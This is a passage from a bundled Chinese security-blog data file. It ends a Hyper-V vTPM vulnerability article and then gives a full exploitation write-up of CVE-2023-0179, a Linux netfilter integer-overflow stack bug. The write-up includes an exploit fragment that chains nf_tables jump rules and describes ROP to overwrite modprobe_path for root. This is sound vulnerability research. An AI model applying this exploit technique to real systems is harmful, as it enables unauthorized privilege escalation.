\u516d\u3001\u603b\u7ed3\\r\\n\\r\\n\u501f\u52a9\u6b64\u6587\u7b80\u5355\u7684\u4ecb\u7ecd\u4e86\u4e0bHyper-V\u865a\u62dfTPM\u7ec4\u4ef6\u7684\u4e24\u4e2a\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e24\u4e2a\u6f0f\u6d1e\u90fd\u662fHyper-V\u865a\u62dfTPM\u7ec4\u4ef6\u5728\u5904\u7406Guest\u6570\u636e\u65f6\u53d1\u751f\u4e86\u9519\u8bef\u5bfc\u81f4\u5bbf\u4e3b\u673a\u8fdb\u7a0b\u53d7\u5230\u4e86\u5f71\u54cd\u3002\u901a\u8fc7\u672c\u6587\u5e2e\u52a9\u8bfb\u8005\u66f4\u597d\u5730\u7406\u89e3\u865a\u62dfTPM\u7ec4\u4ef6\u6f0f\u6d1e\u7684\u6210\u56e0\uff0c\u4ee5\u53ca\u5e0c\u671b\u80fd\u591f\u5728TPM\u7ec4\u4ef6\u7684\u6f0f\u6d1e\u6316\u6398\u5de5\u4f5c\u4e2d\u5e2e\u5230\u5927\u5bb6\u3002\\r\\n\\r\\n## \u4e03\u3001\u4f5c\u8005\u53ca\u4ecb\u7ecd\\r\\n\\r\\n\u4f5c\u8005\uff1aHongZhenhao\\r\\n\\r\\n\u4ecb\u7ecd\uff1a\u5929\u5de5\u5b9e\u9a8c\u5ba4\u5b89\u5168\u7814\u7a76\u5458\uff0c\u4e13\u6ce8\u4e8e Windows\u3001\u4e91\u3001\u865a\u62df\u5316\u9886\u57df\u6f0f\u6d1e\u6316\u6398\u3002\u66fe\u591a\u6b21\u83b7\u5f97\u5fae\u8f6f MSRC \u6700\u9ad8\u6f0f\u6d1e\u8d4f\u91d1\uff0c\u8363\u767b 2019\uff0c2020\uff0c2022 \u5fae\u8f6f MSRC \u5168\u7403\u6700\u5177\u4ef7\u503c\u5b89\u5168\u7cbe\u82f1\u699c\uff0c\u8fde\u7eed\u4e24\u5e74 BlackHat USA \u4e16\u754c\u9ed1\u5e3d\u5927\u4f1a Speaker\u3002"},{"id":"cve-2023-0179-linux","metadata":{"permalink":"/blog/cve-2023-0179-linux","editUrl":"https://github.com/TianGongLab/poc_docs/tree/main/blog/2023-10-18-cve-2023-0179-linux/index.md","source":"@site/blog/2023-10-18-cve-2023-0179-linux/index.md","title":"CVE-2023-0179 Linux\u5185\u6838\u63d0\u6743","description":"0x00 \u524d\u8a00","date":"2023-10-18T00:00:00.000Z","formattedDate":"2023\u5e7410\u670818\u65e5","tags":[{"label":"Linux","permalink":"/blog/tags/linux"},{"label":"Privilege Escalation","permalink":"/blog/tags/privilege-escalation"}],"readingTime":7.63,"hasTruncateMarker":true,"authors":[{"name":"\u674e\u654f","imageURL":"https://github.com/lm0963.png","key":"limin06"}],"frontMatter":{"slug":"cve-2023-0179-linux","title":"CVE-2023-0179 Linux\u5185\u6838\u63d0\u6743","authors":"limin06","tags":["Linux","Privilege Escalation"]},"prevItem":{"title":"Microsoft Hyper-V \u865a\u62df TPM \u8bbe\u5907\u6f0f\u6d1e\u5206\u6790","permalink":"/blog/microsoft-hyper-vtpm"}},"content":"## 0x00 \u524d\u8a00\\r\\n\\r\\n2022\u5e747\u6708\u4e3a\u5929\u5e9c\u676f\u51c6\u5907\u7684Linux\u63d0\u6743\u6f0f\u6d1e\uff0c\u4f46\u662f22\u5e74\u5929\u5e9c\u676f\u6ca1\u529e\uff0c23\u5e741\u6708\u88ab\u5916\u56fd\u4eba\u62a5\u4e86\u3002\\r\\n\\r\\n\u601d\u8def\u6765\u6e90\u4e8e\u8fd9\u7bc7\u6587\u7ae0\uff0c\u5728\u770b\u5230\u8fd9\u7bc7\u6587\u7ae0\u540e\u51b3\u5b9a\u53bb\u597d\u597d\u8fc7\u4e00\u4e0bnetfilter\u76f8\u5173\u6a21\u5757\u3002\\r\\n\\r\\n\u6587\u7ae0\u94fe\u63a5\uff1a[How The Tables Have Turned: An analysis of two new Linux vulnerabilities in nf_tables](https://mp.weixin.qq.com/s?__biz=Mzk0OTU2ODQ4Mw==&mid=2247483772&idx=1&sn=d1a48ae8f391d42e9d8981b67747ccc5&chksm=c35717f0f4209ee67e547252ef5ad6a75654aa19708987f849c1748fc370755562879d39ae48&token=665487310&lang=zh_CN)\\r\\n\\r\\n\x3c!-- truncate --\x3e\\r\\n\\r\\n## 0x01 \u80cc\u666f\\r\\n\\r\\n\u8be5\u6f0f\u6d1e\u4f4d\u4e8eLinux\u5185\u6838\u4e2dnetfilter\u6a21\u5757\u5bf9vlan\u8fdb\u884c\u5904\u7406\u7684\u76f8\u5173\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e\u6574\u578b\u6ea2\u51fa\u5bfc\u81f4\u7684\u6808\u6ea2\u51fa\uff0c\u6700\u540e\u662fROP\u4fee\u6539modprobe_path\u8def\u5f84\u5b8c\u6210\u63d0\u6743\uff0c\u5728Ubuntu\u4e0b\u6d4b\u8bd5\u53ef\u4ee5\u7a33\u5b9a\u89e6\u53d1\uff0c\u63d0\u6743\u6210\u529f\u7387\u767e\u5206\u4e4b\u767e\u3002\\r\\n\\r\\n## 0x02 \u6f0f\u6d1e\u6210\u56e0\uff0c\u52a0\u8fd8\u662f\u51cf\\r\\n\\r\\n\u4e0b\u9762\u662f\u6f0f\u6d1e\u4ee3\u7801\uff0c\u5904\u7406vlan\u76f8\u5173\u7684\u90e8\u5206\u4ee3\u7801\u3002\\r\\n\\r\\n```javascript\\r\\n/* add vlan header into the user buffer for if tag was removed by offloads */\\r\\nstatic bool\\r\\nnft_payload_copy_vlan(u32 *d, const struct sk_buff *skb, u8 offset, u8 len)\\r\\n{\\r\\n  int mac_off = skb_mac_header(skb) - skb->data;\\r\\n  u8 *vlanh, *dst_u8 = (u8 *) d;\\r\\n  struct vlan_ethhdr veth;\\r\\n  u8 vlan_hlen = 0;\\r\\n\\r\\n  if ((skb->protocol == htons(ETH_P_8021AD) ||\\r\\n       skb->protocol == htons(ETH_P_8021Q)) &&\\r\\n      offset >= VLAN_ETH_HLEN && offset < VLAN_ETH_HLEN + VLAN_HLEN)\\r\\n    vlan_hlen += VLAN_HLEN;\\r\\n\\r\\n  vlanh = (u8 *) &veth;\\r\\n  if (offset < VLAN_ETH_HLEN + vlan_hlen) {\\r\\n    u8 ethlen = len;\\r\\n\\r\\n    if (vlan_hlen &&\\r\\n        skb_copy_bits(skb, mac_off, &veth, VLAN_ETH_HLEN) < 0)\\r\\n      return false;\\r\\n    else if (!nft_payload_rebuild_vlan_hdr(skb, mac_off, &veth))\\r\\n      return false;\\r\\n\\r\\n    if (offset + len > VLAN_ETH_HLEN + vlan_hlen)\\r\\n      ethlen -= offset + len - VLAN_ETH_HLEN + vlan_hlen;\\r\\n\\r\\n    memcpy(dst_u8, vlanh + offset - vlan_hlen, ethlen);\\r\\n\\r\\n    len -= ethlen;\\r\\n    if (len == 0)\\r\\n      return true;\\r\\n\\r\\n    dst_u8 += ethlen;\\r\\n    offset = ETH_HLEN + vlan_hlen;\\r\\n  } else {\\r\\n    offset -= VLAN_HLEN + vlan_hlen;\\r\\n  }\\r\\n\\r\\n  return skb_copy_bits(skb, offset + mac_off, dst_u8, len) == 0;\\r\\n}\\r\\n```\\r\\n\\r\\n\u8fd9\u4e00\u6bb5\u4ee3\u7801\u597d\u50cf\u6709\u70b9\u95ee\u9898\uff1f**\u6574\u6570\u6ea2\u51fa\uff01\uff01\uff01**\\r\\n\\r\\n```javascript\\r\\nif (offset + len > VLAN_ETH_HLEN + vlan_hlen)\\r\\n      ethlen -= offset + len - VLAN_ETH_HLEN + vlan_hlen;\\r\\n```\\r\\n\\r\\n\u5728\u5224\u65adif (offset + len > VLAN_ETH_HLEN + vlan_hlen)\u540e\uff0c\u5e94\u8be5\u7528offset + len\u51cf\u53bbVLAN_ETH_HLEN + vlan_hlen\uff0c\u5f88\u660e\u663e\u4ee3\u7801\u4e2d\u5c11\u4e86\u62ec\u53f7\u8fd0\u7b97\uff0c\u4fee\u590d\u8865\u4e01\u4e5f\u662f\u7b80\u5355\u7684\u5c06+\u6539\u4e3a-\u3002\\r\\n\\r\\n```javascript\\r\\noffset + len - (VLAN_ETH_HLEN + vlan_hlen)\\r\\n\\r\\n=>\\r\\n\\r\\noffset + len - VLAN_ETH_HLEN - vlan_hlen\\r\\n```\\r\\n\\r\\n**\u6808\u6ea2\u51fa\uff01\uff01\uff01**\\r\\n\\r\\n```javascript\\r\\nmemcpy(dst_u8, vlanh + offset - vlan_hlen, ethlen);\\r\\n```\\r\\n\\r\\ndst_u8(rdi)\u6307\u5411\u4e0a\u5c42\u8c03\u7528\u51fd\u6570\u7684regs\u6808\u4e0a\u53d8\u91cf\uff0cvlanh(rsi)\u6307\u5411veth\u6808\u4e0a\u53d8\u91cf\uff0cethlen(rcx << 3)\u5728\u6574\u6570\u6ea2\u51fa\u540e\u4f1a\u53d8\u4e3a\u4e00\u4e2a\u8f83\u5927\u503c\u3002\\r\\n\\r\\n ![](./7848c444-c556-44ba-a298-91e2573502d7.png)\\r\\n\\r\\n## 0x03 \u6f0f\u6d1e\u5229\u7528\\r\\n\\r\\n### \u6761\u4ef6\u4e00\uff1a\u9700\u8981CAP_NET_ADMIN\u6743\u9650\\r\\n\\r\\n```javascript\\r\\nstatic void nfnetlink_rcv(struct sk_buff *skb)\\r\\n{\\r\\n        struct nlmsghdr *nlh = nlmsg_hdr(skb);\\r\\n\\r\\n        if (skb->len < NLMSG_HDRLEN ||\\r\\n            nlh->nlmsg_len < NLMSG_HDRLEN ||\\r\\n            skb->len < nlh->nlmsg_len)\\r\\n                return;\\r\\n\\r\\n        if (!netlink_net_capable(skb, CAP_NET_ADMIN)) {\\r\\n                netlink_ack(skb, nlh, -EPERM, NULL);\\r\\n                return;\\r\\n        }\\r\\n\\r\\n        if (nlh->nlmsg_type == NFNL_MSG_BATCH_BEGIN)\\r\\n                nfnetlink_rcv_skb_batch(skb, nlh);\\r\\n        else\\r\\n                netlink_rcv_skb(skb, nfnetlink_rcv_msg);\\r\\n}\\r\\n\\r\\nbool netlink_net_capable(const struct sk_buff *skb, int cap)\\r\\n{\\r\\n  return netlink_ns_capable(skb, sock_net(skb->sk)->user_ns, cap);\\r\\n}\\r\\n```\\r\\n\\r\\n**\u547d\u4ee4\u7a7a\u95f4**\\r\\n\\r\\nLinux\u4e0b\u9ed8\u8ba4\u7684\u6839\u547d\u4ee4\u7a7a\u95f4\u662finit_user_ns\uff0c\u5982\u679cCONFIG_USER_NS\u548cCONFIG_NET_NS\u914d\u7f6e\u9009\u9879\u5f00\u542f\uff0c\u7528\u6237\u4fbf\u53ef\u4ee5\u521b\u5efa\u81ea\u5df1\u7684\u547d\u4ee4\u7a7a\u95f4\uff0c\u5e76\u4e14\u5728\u8be5\u7528\u6237\u547d\u4ee4\u7a7a\u95f4\u4e2d\u83b7\u5f97\u6240\u6709\u6743\u9650\u3002\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u521b\u5efa\u65b0\u7684\u547d\u4ee4\u7a7a\u95f4\u4ee5\u6ee1\u8db3\u4e0a\u8ff0CAP_NET_ADMIN\u6743\u9650\u68c0\u67e5\u3002\\r\\n\\r\\n ![](./81f59f3f-098d-4671-8167-b943b5629a35.png)\\r\\n\\r\\n### \u6761\u4ef6\u4e8c\uff1a\u6ea2\u51fa\u7684\u957f\u5ea6\u4e0d\u8db3\\r\\n\\r\\nethlen\u7684\u7c7b\u578b\u662fu8\uff0c\u90a3\u4e48\u6700\u5927\u503c\u4e3a0xff\uff0c\u5f88\u660e\u663e\u4e0d\u8db3\u4ee5\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0cregs\u53d8\u91cf\u540e\u8ddf\u7740nft_jumpstack\u7ed3\u6784\u4f53\u6570\u7ec4\uff0c\u957f\u5ea6\u4e3a16\uff0c\u5927\u5c0f\u4e3a256\u5b57\u8282\u3002\\r\\n\\r\\n```javascript\\r\\n#define NFT_JUMP_STACK_SIZE  16\\r\\n\\r\\nstruct nft_jumpstack {\\r\\n  const struct nft_chain  *chain;\\r\\n  struct nft_rule  *const *rules;\\r\\n};\\r\\n\\r\\nunsigned int\\r\\nnft_do_chain(struct nft_pktinfo *pkt, void *priv)\\r\\n{\\r\\n  const struct nft_chain *chain = priv, *basechain = chain;\\r\\n  const struct net *net = nft_net(pkt);\\r\\n  struct nft_rule *const *rules;\\r\\n  const struct nft_rule *rule;\\r\\n  const struct nft_expr *expr, *last;\\r\\n  struct nft_regs regs;\\r\\n  unsigned int stackptr = 0;\\r\\n  struct nft_jumpstack jumpstack[NFT_JUMP_STACK_SIZE];\\r\\n  bool genbit = READ_ONCE(net->nft.gencursor);\\r\\n  struct nft_traceinfo info;\\r\\n\\r\\n......\\r\\nida\u53cd\u6c47\u7f16\u7ed3\u679c\\r\\n\\r\\n__int64 __fastcall nft_do_chain(\\r\\n        __int64 *a1,\\r\\n        struct nft_regs *a2,\\r\\n        __int64 a3,\\r\\n        __int64 a4,\\r\\n        __int64 a5,\\r\\n        __int64 a6,\\r\\n        char a7,\\r\\n        int a8,\\r\\n        __int16 a9)\\r\\n{\\r\\n  ......\\r\\n  struct nft_regs regs; // [rsp+60h] [rbp-190h] BYREF\\r\\n  struct nft_jumpstack v51[16]; // [rsp+B0h] [rbp-140h] BYREF\\r\\n  unsigned __int64 canary; // [rsp+1B8h] [rbp-38h]\\r\\n  __int64 v53; // [rsp+1C0h] [rbp-30h]\\r\\n  __int64 v54; // [rsp+1C8h] [rbp-28h]\\r\\n  __int64 v55; // [rsp+1D0h] [rbp-20h]\\r\\n  __int64 v56; // [rsp+1D8h] [rbp-18h]\\r\\n  __int64 v57; // [rsp+1E0h] [rbp-10h]\\r\\n  __int64 v58; // [rsp+1E8h] [rbp-8h]\\r\\n```\\r\\n\\r\\n\u901a\u8fc7\u5229\u7528\u6539\u5199nft_jumpstack\u7ed3\u6784\u4f53\uff0c\u6269\u5927\u8d8a\u754c\u8bfb\u5199\u8303\u56f4\u3002\\r\\n\\r\\n```javascript\\r\\nunsigned int\\r\\nnft_do_chain(struct nft_pktinfo *pkt, void *priv)\\r\\n{\\r\\n  const struct nft_chain *chain = priv, *basechain = chain;\\r\\n  const struct net *net = nft_net(pkt);\\r\\n  struct nft_rule *const *rules;\\r\\n  const struct nft_rule *rule;\\r\\n  const struct nft_expr *expr, *last;\\r\\n  struct nft_regs regs;\\r\\n  unsigned int stackptr = 0;\\r\\n  struct nft_jumpstack jumpstack[NFT_JUMP_STACK_SIZE];\\r\\n  bool genbit = READ_ONCE(net->nft.gencursor);\\r\\n  struct nft_traceinfo info;\\r\\n\\r\\n  info.trace = false;\\r\\n  if (static_branch_unlikely(&nft_trace_enabled))\\r\\n    nft_trace_init(&info, pkt, &regs.verdict, basechain);\\r\\ndo_chain:\\r\\n  if (genbit)\\r\\n    rules = rcu_dereference(chain->rules_gen_1);\\r\\n  else\\r\\n    rules = rcu_dereference(chain->rules_gen_0);\\r\\n\\r\\nnext_rule:\\r\\n  rule = *rules;\\r\\n  regs.verdict.code = NFT_CONTINUE;\\r\\n  for (; *rules ; rules++) {\\r\\n    rule = *rules;\\r\\n    nft_rule_for_each_expr(expr, last, rule) {\\r\\n      if (expr->ops == &nft_cmp_fast_ops)\\r\\n        nft_cmp_fast_eval(expr, &regs);\\r\\n      else if (expr->ops == &nft_bitwise_fast_ops)\\r\\n        nft_bitwise_fast_eval(expr, &regs);\\r\\n      else if (expr->ops != &nft_payload_fast_ops ||\\r\\n         !nft_payload_fast_eval(expr, &regs, pkt))\\r\\n        expr_call_ops_eval(expr, &regs, pkt);\\r\\n\\r\\n      if (regs.verdict.code != NFT_CONTINUE)\\r\\n        break;\\r\\n    }\\r\\n\\r\\n    switch (regs.verdict.code) {\\r\\n    case NFT_BREAK:\\r\\n      regs.verdict.code = NFT_CONTINUE;\\r\\n      continue;\\r\\n    case NFT_CONTINUE:\\r\\n      nft_trace_packet(&info, chain, rule,\\r\\n           NFT_TRACETYPE_RULE);\\r\\n      continue;\\r\\n    }\\r\\n    break;\\r\\n  }\\r\\n\\r\\n  switch (regs.verdict.code & NF_VERDICT_MASK) {\\r\\n  case NF_ACCEPT:\\r\\n  case NF_DROP:\\r\\n  case NF_QUEUE:\\r\\n  case NF_STOLEN:\\r\\n    nft_trace_packet(&info, chain, rule,\\r\\n         NFT_TRACETYPE_RULE);\\r\\n    return regs.verdict.code;\\r\\n  }\\r\\n\\r\\n  switch (regs.verdict.code) {\\r\\n  case NFT_JUMP:\\r\\n    if (WARN_ON_ONCE(stackptr >= NFT_JUMP_STACK_SIZE))\\r\\n      return NF_DROP;\\r\\n    jumpstack[stackptr].chain = chain;\\r\\n    jumpstack[stackptr].rules = rules + 1;\\r\\n    stackptr++;\\r\\n    fallthrough;\\r\\n  case NFT_GOTO:\\r\\n    nft_trace_packet(&info, chain, rule,\\r\\n         NFT_TRACETYPE_RULE);\\r\\n\\r\\n    chain = regs.verdict.chain;\\r\\n    goto do_chain;\\r\\n  case NFT_CONTINUE:\\r\\n  case NFT_RETURN:\\r\\n    nft_trace_packet(&info, chain, rule,\\r\\n         NFT_TRACETYPE_RETURN);\\r\\n    break;\\r\\n  default:\\r\\n    WARN_ON(1);\\r\\n  }\\r\\n\\r\\n  if (stackptr > 0) {\\r\\n    stackptr--;\\r\\n    chain = jumpstack[stackptr].chain;\\r\\n    rules = jumpstack[stackptr].rules;\\r\\n    goto next_rule;\\r\\n  }\\r\\n```\\r\\n\\r\\n ![](./065b65c4-aa16-41fc-92f1-ed336e8ba155.jpeg)\\r\\n\\r\\n ![](./0c63e908-6b17-4832-a95a-e2e1fb9913e4.png)\\r\\n\\r\\n\u901a\u8fc7\u589e\u52a0\u591a\u4e2averdict.code\u4e3aNFT_JUMP\u7684\u89c4\u5219\uff0c\u5728\u89c4\u5219\u6267\u884c\u540e\u5c31\u4f1a\u586b\u5145jumpstack\u6570\u7ec4\uff0c\u5e76\u5728\u6700\u540e\u4e00\u4e2a\u89c4\u5219\u89e6\u53d1\u8d8a\u754c\u5199\uff0c\u4fee\u6539jumpstack\u6570\u7ec4\uff0c\u63a7\u5236\u5176\u4e2d\u7684rules\u6307\u9488\uff0c\u540e\u7eed\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0c\u505aROP\u5373\u53ef\u3002\\r\\n\\r\\n```javascript\\r\\nstruct unft_base_chain_param bp;\\r\\n    bp.hook_num = NF_INET_PRE_ROUTING;\\r\\n    bp.prio = 10;\\r\\n\\r\\n    for (int i = 0; i < exp_chain_num; i++)\\r\\n    {\\r\\n        sprintf(exp_chain_name, \\"%s%d\\", \\"exp_chain\\", i);\\r\\n        void *p = NULL;\\r\\n        if (!i)\\r\\n             p = &bp;\\r\\n        if (create_chain(nl, table_name, exp_chain_name, NFPROTO_BRIDGE, p, &seq, NULL))\\r\\n        {\\r\\n            perror(\\"Failed creating exp chain\\");\\r\\n            exit(EXIT_FAILURE);\\r\\n        }\\r\\n\\r\\n    }\\r\\n\\r\\n    for (int i = 0; i < exp_chain_num; i++)\\r\\n    {\\r\\n        sprintf(exp_chain_name, \\"%s%d\\", \\"exp_chain\\", i);\\r\\n        sprintf(exp_chain_name_next, \\"%s%d\\", \\"exp_chain\\", i+1);\\r\\n\\r\\n        struct nftnl_rule* r = build_rule(table_name, exp_chain_name, NFPROTO_BRIDGE, NULL);\\r\\n\\r\\n        if (!i){\\r\\n            rule_add_payload(r, NFT_PAYLOAD_LL_HEADER, 0x16, 0x40, 1, 0);\\r\\n            char *cmp_str = MAGIC;\\r\\n            rule_add_cmp(r, NFT_CMP_EQ, 1, cmp_str, 6);\\r\\n\\r\\n            uint64_t stack_value = (stack << 16) | 0xffff;\\r\\n            rule_add_payload(r, NFT_PAYLOAD_LL_HEADER, 20, 0x40, 1, 0);\\r\\n            rule_add_cmp(r, NFT_CMP_EQ, 12, &stack_value, 8);\\r\\n        }\\r\\n        if (i == exp_chain_num - 1)\\r\\n            rule_add_payload(r, NFT_PAYLOAD_LL_HEADER, 20, 0x40, 1, 0); // trigger\\r\\n        else\\r\\n            rule_add_immediate_verdict(r, NFT_JUMP, exp_chain_name_next);\\r\\n\\r\\n        err = send_batch_request(\\r\\n                nl,\\r\\n                NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),\\r\\n                NLM_F_CREATE, NFPROTO_BRIDGE, (void**)&r, &seq,\\r\\n                NULL\\r\\n                );\\r\\n        if (err) {\\r\\n            puts(CLR_RED \\"[-] Set exp chain rule failed\\" CLR_RESET);\\r\\n            perror(\\"\\");\\r\\n            exit(EXIT_FAILURE);\\r\\n        }\\r\\n    }\\r\\n```\\r\\n\\r\\n### \u6761\u4ef6\u4e09\uff1a\u89e6\u53d1\u6f0f\u6d1e\u65f6\u5185\u6838\u4e0a\u4e0b\u6587\u4e0d\u786e\u5b9a\\r\\n\\r\\n\u5728recv\u63a5\u6536\u6570\u636e\u65f6\u89e6\u53d1\u6f0f\u6d1e\uff0c\u6240\u4ee5\u4e0d\u786e\u5b9a\u662f\u5728\u54ea\u4e00\u4e2a\u5185\u6838\u4e0a\u4e0b\u6587\u4e2d\uff0c\u6808\u6ea2\u51fa\u540e\u4e5f\u4e0d\u80fd\u76f4\u63a5\u8fd4\u56de\u7528\u6237\u6001\u3002\\r\\n\\r\\n\u4e0d\u8fc7\u591a\u7834\u574f\u6808\u4e0a\u6570\u636e\uff0c\u5728\u6709\u9650\u7684\u6808\u7a7a\u95f4\u5185\u4fee\u6539modprobe_path\uff08\u5728\u8fd0\u884c\u975eELF\u683c\u5f0f\u7684\u4e8c\u8fdb\u5236\u65f6\uff0c\u4f1a\u4ee5root\u6743\u9650\u8c03\u7528\u8be5\u811a\u672c\uff09\u6307\u5411\u6211\u4eec\u53ef\u63a7\u7684\u811a\u672c\uff0c\u6700\u540e\u8c03\u6574rsp\u4e3a\u4e0a\u4e00\u5c42\u672a\u7834\u574f\u7684\u6808\u5e27\uff0c\u6b63\u5e38\u8fd4\u56de\u3002\\r\\n\\r\\n## 0x04 \u603b\u7ed3\\r\\n\\r\\nnetfilter\u5b50\u7cfb\u7edf\u662f\u4e00\u4e2a\u76f8\u5f53\u590d\u6742\u7684\u7cfb\u7edf\uff0c\u501f\u52a9\u6b64\u6587\u4ecb\u7ecd\u4e86CVE-2023-0179\u7684\u6f0f\u6d1e\u6210\u56e0\u548c\u6f0f\u6d1e\u5229\u7528\u8fc7\u7a0b\u4e2d\u7684\u4e00\u4e9b\u6ce8\u610f\u70b9\uff0c\u5e0c\u671b\u80fd\u8d77\u5230\u629b\u7816\u5f15\u7389\u7684\u6548\u679c\u3002"}]}')}}]);